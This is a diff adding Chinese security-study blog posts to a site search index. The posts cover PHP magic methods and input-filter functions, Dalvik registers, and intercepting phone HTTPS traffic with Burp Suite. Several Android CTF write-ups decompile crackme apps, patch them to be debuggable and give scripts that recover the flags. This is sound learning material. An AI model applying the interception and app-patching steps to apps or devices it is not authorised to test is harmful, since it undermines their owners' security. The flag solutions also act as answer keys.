@@ -1,9 +1,490 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[深入浅出PHP中的魔术方法]]></title>
+    <url>%2F2018%2F06%2F10%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E4%B8%AD%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[0x01 引子PHP的魔术方法在反序列化漏洞利用中是十分常见的，因此对于深入理解反序列化漏洞来说，理解PHP中常见的魔术方法也是至关重要的，所以在学习php.net文档中的魔术方法后，写篇文章来总结一下。 0x02 __wakeup()和__sleep()在PHP的序列化与反序列化中wakeup()和sleep()这两个魔术方法是必须到知道的。sleep函数是在序列化的时候会被自动调用，而wakeup函数则实在反序列化的时候被调用，对应的序列化的函数是serialize()，而反序列化函数是unserialize()。 那么如何理解自动调用呢？举个例子，在学习其他面向对象语言，例如java，c++的时候，一定听说过construct函数，一般叫做构造函数，构造函数就是当类被实例化的时候会首先执行构造函数，因此sleep和wakeup两个函数也是类似的，当php进行序列化或者反序列化的时候就会执行sleep或者wakeup函数了。 说完自动调用再来细说一下这两个魔术方法吧。首先是__sleep()函数，sleep函数的原型如下 意味着在写该函数的时候要注意需要有一个返回值，并且该返回值的类型是一个数组，而数组的内容是需要被序列化的变量名称，但是如果你没有这个返回值，PHP会报一个N_NOTICE的错误（就是一个警告），并把NULL给序列化了，举个例子看下图： 无返回值结果我们可以看到爆了一个警告，并且在第二行有个N;，这个就是就是NULL被序列化的结果。 有返回值![]/images/深入浅出PHP中的魔术方法4.png)结果 然后就是__wakeup()函数了wakeup函数原型如下 好吧，没什么好说的，就是当执行unserialize()的时候会执行该魔术方法啦。 0x03 __toString()__toString()魔术方法看名字也能懂，就是当对象被当作字符串来使用的时候会调用该魔术方法。什么叫做把对象当作字符串呢？就比如说echo $obj;这样的，我把一个对象echo出来，那么就会调用这个魔术方法啦。 在PHP5.2.0版本之前呢，只有直接使用echo和print才会生效，但是现在什么年代了，5.2.0几乎没有了，所以我们一般只要记得在任何字符串环境都可以的。 __toString()的原型如下： 这个也是有返回值的，不过返回值的类型是String类型的，因此我们在定义该函数的时候一定要记得返回一个字符串。 然后有一点需要记得那就是不能在toString方法中抛出错误，否则会报error的。那么有的同学一定会问什么是抛出错误了，回答一下就是throw一个error了，博主亲自做了实验，还真的会报错。 0x04 __invoke()invoke也是一个比较常用的函数，当对象是用调用函数的方式来使用的时候就会调用invoke魔术方法。那么什么是用调用函数的方式来使用呢？举个例子，一般我们写一个函数，比如function hello($string){….}这么写，然后想要调用这个函数的话就会hello(“hello”)这么来调用，因此呢，把对象使用函数的方式调用就是$obj($string)这样，括号里面是参数，当然也可以没有。obj是一个new好的对象，这样子就会自动调用invoke魔术方法啦。（PS.只有在PHP5.3.0版本以上才有的，当然现在基本都是这个版本以上了吧） 0x05 PHP“重载”系列接下来要总结的是PHP的“重载”系列的魔术方法了。那么细心的小伙伴一定发现我在重载两个字上打了双引号。这是因为在PHP中，重载跟我们以前在java或者c++中见到的重载不太一样。在c++中，重载是指函数名字一样，但是参数和类型是不一样的，但是在PHP中，重载的意思是动态地“创建”类属性和方法。机智的小伙伴发现这里又有双引号了，好吧，这里的创建的意思包括读取和设置两种意思。 那么在PHP中什么时候使用重载呢？答案就是当调用当前环境下未定义或不可见的属性和方法的时候，会调用重载方法。那么现在一定有小伙伴会问，未定义我们可以理解，那什么是不可见的属性和方法呀，这里解释一下，不可见的属性和方法就比如一个变量是private的，那么我在别的类中就无法访问这个变量了，对于别的类中，这个private变量就是不可见吧，那么我访问了这个private变量，就会调用重载方法啦。 现在该正式开始介绍“重载”系列的魔术方法啦。__get()、__set()、__isset()、__unset() 当我们想要读取未定义或不可见属性的时候会自动调用get当我们想要设置未定义或不可见属性的时候会自动调用set当我们对未定义或不可见属性使用isset()或者empty()时会自动调用isset当我们对未定义或不可见属性使用unset()时会自动调用unset __call、__callstatic 当我们调用一个不可访问的方法的时候会自动调用call当我们调用一个不可访问的静态方法的时候会自动调用callstatic（注意访问静态方法的时候使用“类名::方法名”的方式哦~） 0x06 __clone()当我们复制一个对象的时候，会用到clone这个关键字，当复制完成后，会自动调用clone魔术方法。 0x07 参考http://php.net/]]></content>
+      <categories>
+        <category>PHP安全</category>
+      </categories>
+      <tags>
+        <tag>PHP安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[深入浅出PHP中的Static——静态]]></title>
+    <url>%2F2018%2F06%2F10%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E4%B8%AD%E7%9A%84Static%E2%80%94%E2%80%94%E9%9D%99%E6%80%81%2F</url>
+    <content type="text"><![CDATA[0x01 引子好吧，我不得不承认在写这篇文章之前我对于PHP的静态static的用法只是一知半解，在深入学习了静态的用法后，真的很惭愧，发现以前真的不懂，希望这篇文章能够对看到的读者有所启示（希望你不是跟我一样也是一点也不知道TAT..） 0x02 静态之初试不知道大家是否跟我一样，对于面向对象语言的静态变量其实是听过的，模模糊糊地知道，如果在类中声明了静态变量，那么在函数中操作这个变量，实际上相当于操作这个变量本身，也就是引用，是一个概念的，他不会在函数执行完成后被销毁掉。在这之前，对于静态变量我大概就知道这些吧，那么今天博主带大家再深入理解这个概念吧。 0x03 静态之深入首先要介绍的是，PHP中的静态变量和静态方法是可以在对象没有实例化之前就能使用的，就像这样： 看到没有！！是不是很神奇！！（【捂脸:)】好吧，少见多怪了，大佬勿喷。。）我类A的外面我没有new这个类，只是用了类名加一对冒号接上静态变量和静态方法即可使用12类名::静态变量类名::静态方法 所以说在以前代码审计的时候看到一些用框架写的面向对象的cms，就觉得好像从来没有实例化对象一般，原来是这么回事。。 0x04 静态变量至于使用规则嘛，对于静态变量也没什么好说的了，就是要记住可以在对象没有实例化的时候就可以访问了，可以通过self::静态变量的方式访问本类中的静态变量，当然了，必须在本类的静态方法中使用才行哦~ 0x05 静态方法对于静态方法，规则就比较多了。 静态变量只能通过静态方法来调用就像之前说过的那样，在静态方法中使用self::静态变量的方式可以调用本类中的静态变量，就像这样： 静态方法不能调用非静态变量 静态方法可以调用静态方法 静态方法可以调用非静态方法，但是非静态方法会自动转换为静态方法 我们可以看到，尽管出现了警告，但是hello world!还是echo出来了。]]></content>
+      <categories>
+        <category>PHP安全</category>
+      </categories>
+      <tags>
+        <tag>PHP安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[PHP内置过滤函数总结]]></title>
+    <url>%2F2018%2F06%2F10%2FPHP%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93%2F</url>
+    <content type="text"><![CDATA[0x01 防止SQL注入addslashes()将 单引号（’） 双引号（”） 反斜杠（\） NULL 进行转义 12345678910 &lt;?php$a = $_GET[&apos;a&apos;];$b = addslashes($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; mysql_escape_string()该函数在php4.3的时候被弃用，在php5.3的时候会产生警告，在php7之后彻底移除。 mysql_escape_string不转义%和_ 12345678910&lt;?php$a = $_GET[&apos;a&apos;];$b = mysql_escape_string($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; mysql_real_escape_string()将 单引号（’） 双引号（”） 反斜杠（\） \n \r \x00 \x1a 进行转义 mysql_real_escape_string()函数跟mysql_escape_string函数作用相同，但是mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string() 并不接受连接参数，也不管当前字符集设定。 本函数在php5.5已弃用，在php7之后被移除，应使用Mysqli和PDO_Mysql来替代。 mysqli_real_escape_string()该函数作用与mysql_real_escape_string()函数一样，但是是替代mysql_real_escape_string的。 0x02 防止XSShtmlspecialchars()把预定义的字符转换为html实体12345&amp; (&amp; 符号) &amp;amp;&quot; (双引号) &amp;quot;，除非设置了 ENT_NOQUOTES&apos; (单引号) 设置了 ENT_QUOTES 后， &amp;#039; (如果是 ENT_HTML401) ，或者 &amp;apos; (如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。&lt; (小于) &amp;lt;&gt; (大于) &amp;gt; 默认情况下：1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = htmlspecialchars($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; htmlentities()本函数作用跟htmlspecialchars()一样，但是htmlentites()会转换所有拥有实体的字符。 strip_tag() 去除空字符、HTML 和 PHP 标记后的结果，可以添加第二个参数指定不被去除的字符列表 1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = strip_tags($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; 1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = strip_tags($a, &apos;&lt;a&gt;&apos;);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; 0x03 防止命令执行escapeshellcmd()escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\）会在以下字符之前插入：1234567891011121314151617&amp;#;`|*?~&lt;、&gt;^(、)[、]&#123;、&#125;$\\x0A\xFF ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = escapeshellcmd($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; escapseshellarg()把字符串转码为可以在 shell 命令里使用的参数,escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = escapeshellarg($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt;]]></content>
+      <categories>
+        <category>PHP安全</category>
+      </categories>
+      <tags>
+        <tag>PHP安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Dalvik的两种不同的寄存器表示方法]]></title>
+    <url>%2F2018%2F06%2F10%2FDalvik%E7%9A%84%E4%B8%A4%E7%A7%8D%E4%B8%8D%E5%90%8C%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[0x01 Dalvik的两种不同的寄存器表示方法——v命名法与p命令法在研究安卓逆向的时候，经常在看smali代码中有看到譬如v0啊，p1啊之类的代码，其实这些都表示的是寄存器，只不过表示的方法不同罢了，本文是我学习过程中的笔记吧，算是记录一下。 根据Dalvik虚拟机参数传递方式中的规定：假设一个函数使用到M个寄存器，其中函数的参数是N个，那么参数使用最后的N个寄存器，局部变量使用从头开始的前M-N个寄存器。假设存在一个函数如下12345678910public class Hello&#123; public int foo(int a, int b)&#123; return (a + b) * (a - b); &#125; public static void main(String[] args)&#123; Hello hello = new Hello(); System.out.println(hello.foo(5, 3)); &#125;&#125; 在这段代码代码中，foo函数使用了5个寄存器，2个显示的整形参数，其中foo函数是Hello类的非静态方法，函数被调用是会传入一个隐式的Hello对象引用，因此，实际传入的参数数量是3个。那么局部变量使用前2个寄存器，参数会使用后3个寄存器。 0x02 v命名法v命名法采用以小写字母“v”开头的方式表示函数中用到的局部变量与参数，所有的寄存器命名从v0开始，依次递增。对于foo函数，v命名法会用到v0，v1，v2，v3，v4这五个寄存器，v0和v1表示的是局部变量寄存器，v2表示的是被传入的Hello对象的引用，v3和v4分别表示两个传入的整形参数。 0x03 p命名法p命名法会函数的局部变量寄存器命名没有什么影响，它主要是函数中引入的参数命名从p0开始，依次递增。对于foo函数来说，p命名法会用到v0，v1，p0，p1，p2这五个寄存器，v0和v1表示局部变量寄存器，p0表示的是被传入的Hello对象的引用，p1和p2分别表示两个传入的整形参数。 0x04 参考《Android软件安全与逆向分析》]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>移动安全</tag>
+        <tag>安卓</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[用Burpsuite抓取手机的流量]]></title>
+    <url>%2F2018%2F06%2F10%2F%E7%94%A8Burpsuite%E6%8A%93%E5%8F%96%E6%89%8B%E6%9C%BA%E7%9A%84%E6%B5%81%E9%87%8F%2F</url>
+    <content type="text"><![CDATA[##0x01 安装Burpsuite 首先自然是安装Burpsuite了，安装教程网上有很多，这里就不细说了。 打开Burpsuite，在Porxy -&gt; Options 选项中找到Edit，注意一定要先选中里面的条目后才可以进行编辑，在这里要自己设置端口号和选择下面的第二个选项，具体可以看下图 ##0x02 调试手机 安装好了Burpsuite之后同时也将监听端口设置好了那么就该设置手机选项了。 我用的是安卓手机，至于苹果的话待测，不过感觉应该差不多吧。 首先，在调试以前要确保手机和电脑在同一个WIFI下，打开手机的WLAN选项，然后找到连接的WIFI名称，右边可能会有个更多的选项，如下图 点击后找到后选择手动代理，将我们的电脑的IP输进去，端口填上之前在Burpsuite中设置的那个。 如何查看IP的话，Windows在Dos命令下输入ipconfig 找到无线局域网适配器 WLAN选项，其中的IPv4地址就是了。 这只好后打开手机的浏览器，在地址栏中输入http://burp，会出现如下 点击右上角的CA Certifcate下载证书，用来抓https包用的。 下载之后一般来说都在浏览器的目录下，把证书重命名为cacert.cer后移动到手机存储卡或者本机的根目录（一定要根目录，不然无法安装！！！），接着，到手机的 设置-》安全选项中找到从手机存储和SD卡安装选项，点击后手机自动识别我们下载的证书，注意凭据用途一定要选择VPN和应用 然后就OK啦！ 之后如果想要抓包，就在Burpsuite中的Proxy-》Intercept就可以啦，记得点击Intercept is on按钮！我在手机点了一下应用商店，Burpsuite成功抓包了！]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>移动安全</tag>
+        <tag>工具使用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Smali]]></title>
+    <url>%2F2018%2F06%2F10%2FSmali%2F</url>
+    <content type="text"><![CDATA[0x01 题目描述都说学好Smali是学习Android逆向的基础，现在刚好有一个smali文件，大家一起分析一下吧~~ 0x02 题解这道题下载下来是一个smali文件，先用smali2java工具将其转换为java文件，具体工具可以谷歌一个自己用的比较顺手的 转换之后的代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** * Generated by smali2java 1.0.0.558 * Copyright (C) 2013 Hensence.com */package net.bluelotus.tomorrow.easyandroid;import android.util.Base64;import java.io.PrintStream;import java.security.NoSuchAlgorithmException;import javax.crypto.NoSuchPaddingException;import java.security.InvalidKeyException;import javax.crypto.IllegalBlockSizeException;import javax.crypto.BadPaddingException;import javax.crypto.spec.SecretKeySpec;import javax.crypto.Cipher;import java.security.Key;import java.security.GeneralSecurityException;public class Crackme &#123; private String str2 = &quot;cGhyYWNrICBjdGYgMjAxNg==&quot;; public Crackme() &#123; GetFlag(&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;); &#125; private String GetFlag(String p1) &#123; byte[] &quot;content&quot; = Base64.decode(p1.getBytes(), 0x0); String &quot;kk&quot; = new String(Base64.decode(str2.getBytes(), 0x0)); System.out.println(decrypt(&quot;content&quot;, &quot;kk&quot;)); return null; &#125; private String decrypt(byte[] p1, String p2) &#123; String &quot;m&quot; = 0x0; try &#123; byte[] &quot;keyStr&quot; = p2.getBytes(); SecretKeySpec &quot;key&quot; = new SecretKeySpec(&quot;keyStr&quot;, &quot;AES&quot;); Cipher &quot;cipher&quot; = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); &quot;cipher&quot;.init(0x2, &quot;key&quot;); byte[] &quot;result&quot; = &quot;cipher&quot;.doFinal(p1); return &quot;m&quot;; &#125; catch(NoSuchPaddingException &quot;e&quot;) &#123; &quot;e&quot;.printStackTrace(); &#125; return &quot;m&quot;; &#125;&#125; 分析代码，不难发现这是一个AES ECB模式NoPadding填充模式的解密代码，传入GetFlag函数的base64字符串应该就是flag加密后的base64，str2是密钥，因此直接解密即可得到flag]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>移动安全</tag>
+        <tag>安卓</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[FindPass]]></title>
+    <url>%2F2018%2F06%2F10%2FFindPass%2F</url>
+    <content type="text"><![CDATA[0x01 题目描述无 0x02 题解首先下载到一个apk文件，用模拟器安装一下，看看什么功能，如下 是一个要求输入正确key的程序。 用JEB打开，反汇编查看java源代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.example.findpass;import android.app.Activity;import android.content.Context;import android.os.Bundle;import android.text.TextUtils;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.widget.Toast;import java.io.InputStreamReader;public class MainActivity extends Activity &#123; public MainActivity() &#123; super(); &#125; public void GetKey(View arg16) &#123; String v5 = this.findViewById(2131230721).getText().toString(); if(TextUtils.isEmpty(v5.trim())) &#123; goto label_57; &#125; char[] v4 = this.getResources().getString(2131034115).toCharArray(); int v2 = v4.length; char[] v1 = new char[1024]; try &#123; new InputStreamReader(this.getResources().getAssets().open(&quot;src.jpg&quot;)).read(v1); &#125; catch(Exception v3) &#123; v3.printStackTrace(); &#125; int v6; for(v6 = 0; v6 &lt; v2; ++v6) &#123; int v12 = v1[v4[v6]] % 10; v4[v6] = v6 % 2 == 1 ? ((char)(v4[v6] + v12)) : ((char)(v4[v6] - v12)); &#125; if(v5.equals(new String(v4))) &#123; Toast.makeText(((Context)this), &quot;恭喜您，输入正确！Flag==flag&#123;Key&#125;&quot;, 1).show(); &#125; else &#123; Toast.makeText(((Context)this), &quot;not right! lol。。。。&quot;, 1).show(); return; label_57: Toast.makeText(((Context)this), &quot;请输入key值！&quot;, 1).show(); &#125; &#125; protected void onCreate(Bundle arg2) &#123; super.onCreate(arg2); this.setContentView(2130903040); &#125; public boolean onCreateOptionsMenu(Menu arg3) &#123; this.getMenuInflater().inflate(2131165184, arg3); return 1; &#125; public boolean onOptionsItemSelected(MenuItem arg3) &#123; boolean v1 = arg3.getItemId() == 2131230723 ? true : super.onOptionsItemSelected(arg3); return v1; &#125;&#125; 定位到关键位置123if(v5.equals(new String(v4))) &#123; Toast.makeText(((Context)this), &quot;恭喜您，输入正确！Flag==flag&#123;Key&#125;&quot;, 1).show(); &#125; 当v5等于v4的时候，就是正确的，这里v5是我们输入的值，而v4的话，我们向上看首先1char[] v4 = this.getResources().getString(2131034115).toCharArray(); v4是从控件中获取到的值，然后到下面12345int v6;for(v6 = 0; v6 &lt; v2; ++v6) &#123; int v12 = v1[v4[v6]] % 10; v4[v6] = v6 % 2 == 1 ? ((char)(v4[v6] + v12)) : ((char)(v4[v6] - v12));&#125; 进行一系列的变换后得到最终值，那么就是说，我们可以通过动态调试获取到最后v4变换的值，而那个就是我们需要的key！！ 动态调试的话首先我们需要在apk中的AndoridMainifest.xml文件中，在application标签中添加1android:debuggable=&quot;true&quot; 然后重新编译打包成apk，这些步骤可以用AndroidKiller来轻松搞定，然后，用安卓逆向助手将class.dex文件提取出来，IDA打开！（在用IDA加载之前记得用Andorid stutio模拟器安装apk！）在右侧的Function Window中用Ctrl+F快速定位到GetKey函数，我们可以在 此处下个断点，然后在查看变量列表中的值即可。 在菜单栏中选择Debugger -》Debugger options勾选Suspend on process entry point并在下面点击Set specific options，填写Package name和Activity，这些信息在AndroidMainifest.xml中都有显示 然后选择Debugger -》Debugger windows-》locals 按F9开始运行 此时可以点击中间的suspend按钮暂停，然后选择Debugger -》Debugger windows-》Locals，将Local列表拖出来方便观察 之后点击IDA左上角的绿色三角符号开始，在模拟器中输入任意字符串，看到v4的值就是正确的key了！ 我们将这个字符串输入到程序中来验证一番 正确！]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>移动安全</tag>
+        <tag>安卓</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[61dctf - androideasy]]></title>
+    <url>%2F2018%2F06%2F10%2F61dctf-androideasy%2F</url>
+    <content type="text"><![CDATA[0x01 题目描述无 0x02 题解这道题也是个apk，很尴尬的是我安装不上，不知道究竟是为什么。。那直接拖进jeb看看能否反汇编 成功反汇编成java代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.a.sample.androidtest;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View$OnClickListener;import android.view.View;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity &#123; private EditText editText; private byte[] s; public MainActivity() &#123; super(); this.s = new byte[]&#123;113, 123, 118, 112, 108, 94, 99, 72, 38, 68, 72, 87, 89, 72, 36, 118, 100, 78, 72, 87, 121, 83, 101, 39, 62, 94, 62, 38, 107, 115, 106&#125;; &#125; public boolean check() &#123; boolean v2 = false; byte[] v0 = this.editText.getText().toString().getBytes(); if(v0.length == this.s.length) &#123; int v1 = 0; while(v1 &lt; this.s.length) &#123; if(v1 &gt;= v0.length) &#123; break; &#125; if(this.s[v1] == (v0[v1] ^ 23)) &#123; ++v1; continue; &#125; else &#123; return v2; &#125; &#125; v2 = true; &#125; return v2; &#125; protected void onCreate(Bundle arg4) &#123; super.onCreate(arg4); this.setContentView(2130968603); this.editText = this.findViewById(2131427415); this.findViewById(2131427416).setOnClickListener(new View$OnClickListener(this) &#123; public void onClick(View arg4) &#123; if(MainActivity.this.check()) &#123; Toast.makeText(this.val$context, &quot;You got the flag!&quot;, 1).show(); &#125; else &#123; Toast.makeText(this.val$context, &quot;Sorry your flag is wrong&quot;, 1).show(); &#125; &#125; &#125;); &#125;&#125; 可以看到当check返回true的话就会得到flag了。那就看check函数，如果我们输入的字符串的每一位都与23异或后的结果等于s数组中对应的值，那么在全部完成31次后check函数就会返回true那么很容易逆过来，脚本如下123456789s = [113, 123, 118, 112, 108, 94, 99, 72, 38, 68, 72, 87, 89, 72, 36, 118, 100, 78, 72, 87, 121, 83, 101, 39, 62, 94, 62, 38, 107, 115, 106]result = &apos;&apos;for i in range(len(s)): result += chr(int(s[i]) ^ 23)print result]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>移动安全</tag>
+        <tag>安卓</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[DD Android Normal]]></title>
+    <url>%2F2018%2F06%2F10%2FDD-Android-Normal%2F</url>
+    <content type="text"><![CDATA[0x01 题目描述提交下一关的邮箱地址。 解压密码 infected。 0x02 题解这道题下载的是一个zip文件，用题目给的压缩密码解压，得到一个apk和一个readme.txt readme.txt如下： 12345赛题背景：本挑战结合了Android, Java, C/C++，加密算法等知识点，考察了挑战者的binary逆向技术和加密算法能力。赛题描述：本题是一个app，请试分析app中隐藏的key，逆向加密算法并得到对应的秘钥。可以在app中尝试输入key，如果正确会显示“correct”，如果错误会显示“Wrong”。提 示：阅读assembly code，理解xor的加密逻辑和参数，解出答案。评分标准：key正确则可进入下一题。 按照描述，将apk送入jeb尝试反汇编 1234567891011121314151617181920212223242526272829303132333435363738package com.didictf.hellolibs;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.TextView;public class MainActivity extends AppCompatActivity &#123; private TextView mFlagEntryView; private TextView mFlagResultView; static &#123; System.loadLibrary(&quot;hello-libs&quot;); &#125; public MainActivity() &#123; super(); &#125; public void onClickTest(View arg3) &#123; if(this.mFlagEntryView.getText().toString().equals(this.stringFromJNI())) &#123; this.mFlagResultView.setText(&quot;Correct&quot;); &#125; else &#123; this.mFlagResultView.setText(&quot;Wrong&quot;); &#125; &#125; protected void onCreate(Bundle arg2) &#123; super.onCreate(arg2); this.setContentView(2130968602); this.mFlagEntryView = this.findViewById(2131427413); this.mFlagResultView = this.findViewById(2131427415); &#125; public native String stringFromJNI() &#123; &#125;&#125; 代码没什么用，看到最后的方法有一个native关键字，知道这个是JNI，因此得调试.so文件，看到上面程序也调用了hellolibs，那么我们将hellolibs.so提取出来 用IDA打开.so文件，发现在HEX View中直接有flag。。]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>移动安全</tag>
+        <tag>安卓</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[DD Android Easy]]></title>
+    <url>%2F2018%2F06%2F10%2FDD-Android-Easy%2F</url>
+    <content type="text"><![CDATA[0x01 题目描述无 0x02 题解下载的是一个apk文件，安装到模拟器发显示一个猜密码程序 送入jeb尝试反汇编，成功反汇编成java代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.didi_ctf.flagapp;import android.os.Bundle;import android.support.v7.a.d;import android.view.View;import android.widget.TextView;public class FlagActivity extends d &#123; private static String m; private TextView n; private TextView o; private static final byte[] p; private static final byte[] q; static &#123; FlagActivity.m = &quot;com.didi_ctf.flagapp.FlagActivity&quot;; FlagActivity.p = new byte[]&#123;-40, -62, 107, 66, -126, 103, -56, 77, 122, -107, -24, -127, 72, -63, -98, 64, -24, -5, -49, -26, 79, -70, -26, -81, 120, 25, 111, -100, -23, -9, 122, -35, 66, -50, -116, 3, -72, 102, -45, -85, 0, 126, -34, 62, 83, -34, 48, -111, 61, -9, -51, 114, 20, 81, -126, -18, 27, -115, -76, -116, -48, -118, -10, -102, -106, 113, -104, 98, -109, 74, 48, 47, -100, -88, 121, 22, -63, -32, -20, -41, -27, -20, -118, 100, -76, 70, -49, -39, -27, -106, -13, -108, 115, -87, -1, -22, -53, 21, -100, 124, -95, -40, 62, -69, 29, 56, -53, 85, -48, 25, 37, -78, 11, -110, -24, -120, -82, 6, -94, -101&#125;; FlagActivity.q = new byte[]&#123;-57, -90, 53, -71, -117, 98, 62, 98, 101, -96, 36, 110, 77, -83, -121, 2, -48, 94, -106, -56, -49, -80, -1, 83, 75, 66, -44, 74, 2, -36, -42, -103, 6, -115, -40, 69, -107, 85, -78, -49, 54, 78, -26, 15, 98, -70, 8, -90, 94, -61, -84, 64, 112, 51, -29, -34, 126, -21, -126, -71, -31, -24, -60, -2, -81, 66, -84, 85, -91, 10, 84, 70, -8, -63, 26, 126, -76, -104, -123, -71, -126, -62, -23, 11, -39, 70, 14, 59, -101, -39, -124, 91, -109, 102, -49, 21, 105, 0, 37, -128, -57, 117, 110, -115, -86, 56, 25, -46, -55, 7, -125, 109, 76, 104, -15, 82, -53, 18, -28, -24&#125;; &#125; public FlagActivity() &#123; super(); &#125; private String i() &#123; int v1 = 0; byte[] v2 = new byte[FlagActivity.p.length]; int v0; for(v0 = 0; v0 &lt; v2.length; ++v0) &#123; v2[v0] = ((byte)(FlagActivity.p[v0] ^ FlagActivity.q[v0])); &#125; int v3 = v2[0]; for(v0 = 0; v2[v3 + v0] != 0; ++v0) &#123; &#125; byte[] v4 = new byte[v0]; while(v1 &lt; v0) &#123; v4[v1] = v2[v3 + v1]; ++v1; &#125; return new String(v4); &#125; public void onClickTest(View arg3) &#123; if(this.n.getText().toString().equals(this.i())) &#123; this.o.setText(2131099685); &#125; else &#123; this.o.setText(2131099683); &#125; &#125; protected void onCreate(Bundle arg2) &#123; super.onCreate(arg2); this.setContentView(2130968602); this.n = this.findViewById(2131427413); this.o = this.findViewById(2131427415); &#125;&#125; 针对算法写出脚本，得到flag1234567891011121314151617181920212223242526272829p = [-40, -62, 107, 66, -126, 103, -56, 77, 122, -107, -24, -127, 72, -63, -98, 64, -24, -5, -49, -26, 79, -70, -26, -81, 120, 25, 111, -100, -23, -9, 122, -35, 66, -50, -116, 3, -72, 102, -45, -85, 0, 126, -34, 62, 83, -34, 48, -111, 61, -9, -51, 114, 20, 81, -126, -18, 27, -115, -76, -116, -48, -118, -10, -102, -106, 113, -104, 98, -109, 74, 48, 47, -100, -88, 121, 22, -63, -32, -20, -41, -27, -20, -118, 100, -76, 70, -49, -39, -27, -106, -13, -108, 115, -87, -1, -22, -53, 21, -100, 124, -95, -40, 62, -69, 29, 56, -53, 85, -48, 25, 37, -78, 11, -110, -24, -120, -82, 6, -94, -101]q = [-57, -90, 53, -71, -117, 98, 62, 98, 101, -96, 36, 110, 77, -83, -121, 2, -48, 94, -106, -56, -49, -80, -1, 83, 75, 66, -44, 74, 2, -36, -42, -103, 6, -115, -40, 69, -107, 85, -78, -49, 54, 78, -26, 15, 98, -70, 8, -90, 94, -61, -84, 64, 112, 51, -29, -34, 126, -21, -126, -71, -31, -24, -60, -2, -81, 66, -84, 85, -91, 10, 84, 70, -8, -63, 26, 126, -76, -104, -123, -71, -126, -62, -23, 11, -39, 70, 14, 59, -101, -39, -124, 91, -109, 102, -49, 21, 105, 0, 37, -128, -57, 117, 110, -115, -86, 56, 25, -46, -55, 7, -125, 109, 76, 104, -15, 82, -53, 18, -28, -24]m = []j = 0n = 0flag = &quot;&quot;k = int(p[0]) ^ int(q[0])for i in range(len(p)): m.append(int(p[i] ^ q[i]))while True: if int(m[k+j]) == 0: count = j break j += 1while n &lt; count: flag += chr(m[k + n]) n += 1print flag]]></content>
+      <categories>
+        <category>移动安全</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>移动安全</tag>
+        <tag>安卓</tag>
